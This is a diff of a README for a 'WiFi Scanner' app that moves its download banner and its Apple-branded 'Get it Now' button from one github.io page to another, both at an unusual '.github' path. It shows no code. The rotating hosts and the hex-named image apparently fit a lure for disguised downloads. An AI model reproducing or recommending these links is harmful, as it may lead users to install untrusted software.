@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gunbpx.github.io/.github/wiFiScanner">
+  <a href="https://maopolo-sot.github.io/.github/wiFiScanner">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download WiFi Scanner"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The network device discovery capability addresses a security concern that many h
 
 <p align="center">
 
-[![Get it Now WiFi Scanner](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/wiFiScanner)
+[![Get it Now WiFi Scanner](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/wiFiScanner)
 
 </p>
 
